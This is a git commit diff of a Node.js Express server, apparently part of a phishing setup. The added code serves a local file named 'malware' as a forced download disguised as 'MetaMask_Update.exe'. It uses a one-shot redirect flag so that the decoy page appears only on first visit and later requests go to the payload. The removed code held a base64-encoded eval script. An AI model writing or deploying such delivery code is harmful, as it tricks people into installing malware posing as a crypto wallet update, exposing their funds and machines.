d1bab22bf8d2c250ea22f2baf9cb7f03d5953441
clouds-admins-logins-ads-google-com <zeeagil11@gmail.com>
2025-09-01 16:06:51 +0700

    Update server.js

--- server.js
+++ server.js
@@ -1,36 +1,38 @@
 const express = require('express');
-const ngrok = require("ngrok");
- const fs = require('fs');
- const path = require('path');
- const app = express();
- const PORT = 3000;
- let redirect = false;
- app.get('/', (req, res) => {
-     redirect = true;
-     res.setHeader('Cache-Control', 'no-store');
-     res.redirect('/index1.html');
- });
- app.get('/index1.html', (req, res) => {
-     res.setHeader('Cache-Control', 'no-store');
-     if (redirect) {
-         redirect = false;
-         res.sendFile(path.join(__dirname, 'index1.html'));
-     } else {
-         res.redirect('/data');
-     }
- });
-app.get('/data', (req, res) => {
-    res.setHeader('Content-Type', 'text/html');
-    res.send(`
-     <script>
-    eval(atob("YWxlcnQoIkhlbGxvISBBbmRhIG1lbmdha2VzIC9kYXRhIik7"));
-</script>
-    `);
-});
-app.listen(PORT, async () => {
-  console.log(`Server running on http://localhost:${PORT}`);
+const fs = require('fs');
+const path = require('path');
+const app = express();
+const PORT = 3000;
 
-  // expose via ngrok
-  const url = await ngrok.connect(PORT);
-  console.log("Public URL:", url);
+let redirect = false;
+
+app.get('/', (req, res) => {
+    redirect = true;
+    res.setHeader('Cache-Control', 'no-store');
+    res.redirect('/index.html');
+});
+
+app.get('/index.html', (req, res) => {
+    res.setHeader('Cache-Control', 'no-store');
+    if (redirect) {
+        redirect = false;
+        res.sendFile(path.join(__dirname, 'index.html'));
+    } else {
+        res.redirect('/data');
+    }
+});
+
+app.get('/data', (req, res) => {
+    const filePath = path.join(__dirname, 'malware');
+    if (!fs.existsSync(filePath) || fs.statSync(filePath).isDirectory()) {
+        return res.status(404).send('File not found');
+    }
+    res.setHeader('Cache-Control', 'no-store');
+    res.setHeader('Content-Type', 'application/octet-stream');
+    res.setHeader('Content-Disposition', 'attachment; filename="MetaMask_Update.exe"');
+    fs.createReadStream(filePath).pipe(res);
+});
+
+app.listen(PORT, () => {
+    console.log(`Server running on http://localhost:${PORT}`);
 });
